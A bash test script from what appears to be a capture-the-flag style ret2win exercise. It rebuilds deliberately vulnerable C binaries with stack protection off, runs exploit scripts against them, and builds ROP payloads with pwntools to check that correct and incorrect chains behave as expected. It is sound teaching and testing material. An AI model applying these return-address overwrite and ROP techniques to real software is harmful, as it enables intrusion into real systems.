#!/usr/bin/env bash
#
# verify.sh - rebuilds the three targets from source and verifies that the
# exploits work, and that inputs which should NOT work are rejected.
#
# Run from 03-binexp-control-flow/ret2win/ inside the pwntools virtualenv:
#     ./verify.sh
#
# Exits non-zero if any check fails, so it can be driven from a Makefile or CI.

set -u

FLAG='entrypoint{ret2win_success}'
SHELL_MARK='__SHELL_OK__'
PASS=0
FAIL=0

pass() { printf '[PASS] %s\n' "$1"; PASS=$((PASS + 1)); }
fail() { printf '[FAIL] %s\n' "$1"; [ $# -gt 1 ] && printf '       %s\n' "$2"; FAIL=$((FAIL + 1)); }

command -v gcc >/dev/null 2>&1 || { echo "missing gcc" >&2; exit 2; }
python3 -c 'import pwn' 2>/dev/null || { echo "pwntools not importable - activate the virtualenv" >&2; exit 2; }

# Rebuild first, so we are never testing an exploit against a stale binary.
# The -Wstringop-overflow warning is expected - it is the vulnerability itself.
echo "rebuilding targets from source"
gcc -g -O0 -fno-stack-protector -no-pie         -o vuln  vuln.c  2>/dev/null
gcc -g -O0 -fno-stack-protector -no-pie         -o vuln2 vuln2.c 2>/dev/null
gcc -g -O0 -fno-stack-protector -no-pie -static -o vuln3 vuln3.c 2>/dev/null

for b in vuln vuln2 vuln3; do
    [ -x "$b" ] || { echo "build failed: $b" >&2; exit 2; }
done
echo

# ---------------------------------------------------------------------------
echo "--- the exploits should work ---"
# ---------------------------------------------------------------------------
# An exploit must satisfy two conditions, not one. The flag alone is not
# enough: in exercise 1 the flag printed while system() died on stack
# alignment, so a flag-only check would have passed a broken exploit. The
# shell marker is what proves execution survived into /bin/sh.

LAST_OUT=''

run_exploit() {
    local script="$1" label="$2"
    LAST_OUT=$(printf 'echo %s\nexit\n' "$SHELL_MARK" | timeout 30 python3 "$script" 2>&1)

    if ! grep -qF "$FLAG" <<<"$LAST_OUT"; then
        fail "$label: flag not printed" "control flow never reached the win function"
        return 1
    fi
    if ! grep -qF "$SHELL_MARK" <<<"$LAST_OUT"; then
        fail "$label: flag printed but the shell did not answer" \
             "reached win(), but system() died - check stack alignment"
        return 1
    fi
    pass "$label"
    return 0
}

run_exploit exploit.py  'exploit.py  -> vuln  (offset 72,  [ret, win])'
run_exploit exploit2.py 'exploit2.py -> vuln2 (offset 104, [ret, win])'
run_exploit exploit3.py 'exploit3.py -> vuln3 (offset 72,  [pop_rdi_rbp, 151060, 0, win])'

# win(int code) in vuln3 prints "Access denied. Invalid code." for any value
# other than 151060, so the branch it took tells us whether rdi carried the
# argument. Reuses the output captured above - no second run needed.
if grep -q 'Access denied' <<<"$LAST_OUT"; then
    fail "exploit3.py: win() took the denied branch - rdi did not carry 151060"
else
    pass "exploit3.py: win() took the granted branch - rdi carried 151060"
fi
echo

# ---------------------------------------------------------------------------
echo "--- wrong input should NOT work ---"
# ---------------------------------------------------------------------------
# Without these, "4 passed" would only prove the script can print [PASS].
# Each case changes exactly one thing away from a working payload and asserts
# the flag stays absent, so each one isolates a single claim in writeup.md.

# Builds a payload on stdout. `ret`, `pop_rdi_rbp` and `elf` are in scope.
gen() {
    python3 -c "
import sys
from pwn import *
context.log_level = 'error'
elf = context.binary = ELF('$1')
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
g = rop.find_gadget(['pop rdi', 'pop rbp', 'ret'])
pop_rdi_rbp = g[0] if g else 0
sys.stdout.buffer.write($2)
"
}

expect_no_flag() {
    local label="$1" bin="$2" expr="$3" detail="$4" out
    out=$(gen "$bin" "$expr" | timeout 20 "$bin" 2>&1)
    if grep -qF "$FLAG" <<<"$out"; then
        fail "$label: the flag printed anyway" "$detail"
    else
        pass "$label"
    fi
}

# 1. A crash on its own proves nothing - these binaries have no SIGSEGV
#    handler, so garbage must die silently.
expect_no_flag 'plain garbage input gives no flag' \
    ./vuln "b'A' * 200" \
    'overwriting the return address with garbage must not reach win()'

# 2. Offset 73 is one of the values the endianness mistake in 1.3 produced.
#    The chain is otherwise identical to the working exploit.
expect_no_flag 'offset 73 (the endianness mistake) gives no flag' \
    ./vuln "flat({73: [ret, elf.symbols['win']]})" \
    'an offset one byte off leaves the return address half filler'

# 3. Same chain as exploit3.py with the argument changed by one. This isolates
#    rdi: if the flag printed here, the check in win() would be meaningless.
denied_out=$(gen ./vuln3 "flat({72: [pop_rdi_rbp, 151059, 0, elf.symbols['win']]})" \
    | timeout 20 ./vuln3 2>&1)
if grep -qF "$FLAG" <<<"$denied_out"; then
    fail 'code 151059 gives no flag: the flag printed anyway' \
         'win() granted access for the wrong value - the comparison is not doing its job'
elif grep -q 'Access denied' <<<"$denied_out"; then
    pass 'code 151059 reaches win() but is denied - rdi is what decides'
else
    fail 'code 151059: neither flag nor denial message' \
         'win() was never reached, so this case does not isolate rdi'
fi
echo

# ---------------------------------------------------------------------------
printf -- '--- %d passed, %d failed ---\n' "$PASS" "$FAIL"

if [ "$FAIL" -eq 0 ]; then
    echo "the exploits work, and wrong input does not."
    exit 0
else
    echo "writeup.md and the binaries disagree."
    exit 1
fi